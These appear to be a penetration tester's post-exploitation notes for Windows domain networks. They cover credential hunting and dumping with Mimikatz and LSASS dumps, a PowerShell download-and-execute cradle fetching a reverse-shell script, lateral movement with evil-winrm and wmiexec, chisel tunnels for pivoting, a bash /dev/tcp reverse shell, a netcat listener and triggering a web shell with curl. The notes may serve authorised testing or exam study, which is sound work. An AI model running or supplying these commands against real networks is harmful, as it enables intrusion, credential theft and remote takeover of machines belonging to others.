
Once we have moved laterally or pivoted

Find creds
- cmdkey /list
- PowerShell history
- Config files
- Memory dumps
- Reuse domain passwords
Dump creds
- Mimikatz

Drop a shell
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[my IP]/rev.ps1')"
```

Move further laterally
```
Enter-PSSession -ComputerName FILE01 -Credential [user]
```


1) Enumerate
Nmap quick sweep
```
proxychains nmap -sT -F -Pn -p 445,139,135,5985,3389,1433,80,88,389 [IP]
```

2) Identify
If we see;
- 445 + 389 + 88 = DC
- 445 + lost of share = File Server
- 1433 = MSSQL

3) Try lateral movement with current credentials 
```
proxychains evil-winrm -i [IP] -u [user] -p [password]
```
```
proxychains wmiexec.py DOMAIN/user:password@[IP]
```

4) Dump credentials
Mimikatz
LSASS dump
Domain creds

 5) Enumerate
 You standard windows enumeration
 - Domain users, groups
 - Password reuse
 - net user /domain
 - PowerView
 - BloodHound

5) Check if you need to pivot again or if inbound connections are restricted

6) Reverse shell through chisel
Set up our tunnel:
Kali
```
chisel server -p 8000 --reverse
```
compromised machine
```
chisel client [kali IP]:8000 R:socks
```

Generate a shell (msfvenom - LHOST is the compromised machine. NOT kali)
- or use bash -i >& /dev/tcp/[compromised-machineIP]/4444 0>&1
Transfer to internal machine using proxychains 

Set pivot point to catch shell
We use a different tunnel port (8001 instead of 8000)
On compromised machine
```
chisel client [kali IP]:8001 4444:127.0.0.1:4444
```
on kali 
```
chisel server -p 8001 --reverse
```
```
nc -nvlp 4444
```

Execute shell
e.g.
```
proxychains curl http://[Internal IP]/shell.aspx
```